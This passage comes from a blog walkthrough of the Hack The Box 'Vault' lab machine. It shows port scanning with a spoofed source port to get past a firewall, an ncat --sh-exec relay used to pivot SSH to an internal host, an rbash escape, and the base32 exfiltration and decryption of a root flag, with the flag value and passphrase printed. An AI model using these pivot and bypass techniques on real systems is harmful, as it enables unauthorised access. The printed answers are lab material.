/var/log/auth.log:1383:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
N[ÔøΩÔøΩz&lt;ssh:nottyalex192.168.122.1ÔøΩN[ÔøΩÔøΩz&lt;ssh:nottyalex192.168.122.1ÔøΩN[ÔøΩÔøΩzÔøΩssh:nottydave192.168.122.1N[ÔøΩÔøΩzÔøΩssh:nottydave192.168.5.2d2W[ÔøΩÔøΩÔøΩssh:nottydave192.168.122.1ÔøΩ7W[ÔøΩÔøΩzÔøΩssh:nottydave192.168.122.1‚ñí8W[ÔøΩÔøΩzÔøΩssh:nottydave192.168.122.18W[ÔøΩÔøΩzÔøΩÔøΩtty1tty1daveÔøΩm9ÔøΩ[‹ß]ssh:nottydave192.168.122.1@ÔøΩ[ÔøΩÔøΩzcssh:nottydave192.168.122.1ÔøΩTÔøΩ[ÔøΩÔøΩz3\9ÔøΩ[#P
</code></pre><ul><li>We see that <code>nmap</code> is installed, let&rsquo;s use to port scan <code>192.168.5.2</code></li></ul><pre tabindex=0><code>root@DNS:/home/dave# nmap 192.168.5.2 -Pn -f

Starting Nmap 7.01 ( https://nmap.org ) at 2023-10-25 16:39 BST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0035s latency).
Not shown: 998 filtered ports
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524

Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
</code></pre><ul><li>Ports are closed, but if we set <code>--source-port=4444</code> identical to logs, we see <code>987</code> is open<ul><li>Same goes for <code>--source-port=53</code>,</li></ul></li></ul><pre tabindex=0><code>root@DNS:/home/dave# nmap 192.168.5.2 -Pn -f --source-port=4444

Starting Nmap 7.01 ( https://nmap.org ) at 2023-10-25 16:40 BST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0029s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds
</code></pre><ul><li>If we check port <code>987</code> via <code>nc</code>, we receive <code>ssh</code> banner</li></ul><pre tabindex=0><code>root@DNS:/home/dave# nc 192.168.5.2 987 -p 53
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
</code></pre><ul><li>We can&rsquo;t set source port on <code>ssh</code><ul><li>But we saw entries in log: <code>COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53</code></li><li>It runs <code>ncat</code> listening to port <code>1234</code><ul><li>The option <code>--sh-exec</code> will execute command by passing it to <code>/bin/sh -c</code><ul><li>In our case we will have <code>/bin/sh -c "ncat 192.168.5.2 987 -p 53"</code></li></ul></li><li>So we will have a our netcat listening to port <code>1234</code> and redirecting everything to <code>ncat 192.168.5.2 987 -p 53</code></li></ul></li><li>Let&rsquo;s run it in the background mode and connect as <code>dave</code></li></ul></li></ul><pre tabindex=0><code>root@DNS:/home/dave# /usr/bin/ncat -l 1234 --sh-exec &#34;ncat 192.168.5.2 987 -p 53&#34; &amp;
[1] 13700
root@DNS:/home/dave# ssh dave@localhost -p 1234
The authenticity of host &#39;[localhost]:1234 ([::1]:1234)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;[localhost]:1234&#39; (ECDSA) to the list of known hosts.
dave@localhost&#39;s password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.


Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$ 
</code></pre><ul><li>Inside we have <code>root.txt.pgp</code></li></ul><pre tabindex=0><code>dave@vault:~$ ls -lha
total 40K
drwxr-xr-x 5 dave dave 4.0K Sep  3  2018 .
drwxr-xr-x 4 root root 4.0K Jul 17  2018 ..
-rw------- 1 dave dave   11 Sep  3  2018 .bash_history
-rw-r--r-- 1 dave dave  220 Jul 17  2018 .bash_logout
-rw-r--r-- 1 dave dave 3.7K Jul 17  2018 .bashrc
drwx------ 2 dave dave 4.0K Jul 17  2018 .cache
drwxrwxr-x 2 dave dave 4.0K Sep  2  2018 .nano
-rw-r--r-- 1 dave dave  655 Jul 17  2018 .profile
-rw-rw-r-- 1 dave dave  629 Sep  3  2018 root.txt.gpg
drwx------ 2 dave dave 4.0K Jul 17  2018 .ssh
dave@vault:~$ 
</code></pre><ul><li>We can&rsquo;t do anything else, since we are inside <code>rbash</code><ul><li>Reconnect to <code>ssh</code> with <code>-t bash</code></li></ul></li></ul><pre tabindex=0><code>root@DNS:/home/dave# /usr/bin/ncat -l 1234 --sh-exec &#34;ncat 192.168.5.2 987 -p 53&#34; &amp;
[1] 13705
root@DNS:/home/dave# ssh dave@localhost -p 1234 -t bash
dave@localhost&#39;s password: 
dave@vault:~$ 
</code></pre><ul><li>If we try to decrypt <code>gpg</code>, we receive an error<ul><li>It relies on key stored in the local keyring</li></ul></li></ul><pre tabindex=0><code>dave@vault:~$ gpg -d root.txt.gpg
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
</code></pre><ul><li>Let&rsquo;s move it to other hosts and try to decrypt it</li></ul><pre tabindex=0><code>dave@vault:~$ base32 -w0 root.txt.gpg 
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=
</code></pre><pre tabindex=0><code>dave@ubuntu:~$ nano flag
dave@ubuntu:~$ base32 -d flag &gt; flag.gpg
</code></pre><ul><li><code>dns</code> had the same issue, but original box was successful<ul><li>And the passphrase is located in <code>dave</code>&rsquo;s desktop in <code>key</code> file</li></ul></li></ul><pre tabindex=0><code>dave@ubuntu:~$ gpg -d flag.gpg 

You need a passphrase to unlock the secret key for
user: &#34;david &lt;dave@david.com&gt;&#34;
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      &#34;david &lt;dave@david.com&gt;&#34;
ca468370b91d1f5906e31093d9bfe819
</code></pre><pre tabindex=0><code>dave@ubuntu:~/Desktop$ cat key 
itscominghome
</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fvault%2f&text=%5bHTB%5d%20Machine%3a%20Vault&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
</a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fvault%2f&title=%5bHTB%5d%20Machine%3a%20Vault" target=_blank><i class="fab fa-reddit"></i>
</a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fvault%2f&title=%5bHTB%5d%20Machine%3a%20Vault" target=_blank><i class="fab fa-linkedin"></i>
</a><a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Vault&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fvault%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/vault/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Validation</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/waldo/ title="[HTB] Machine: Waldo" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Waldo</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user>User</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
Toha</a></div><div class="col-md-4 text-center">¬© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>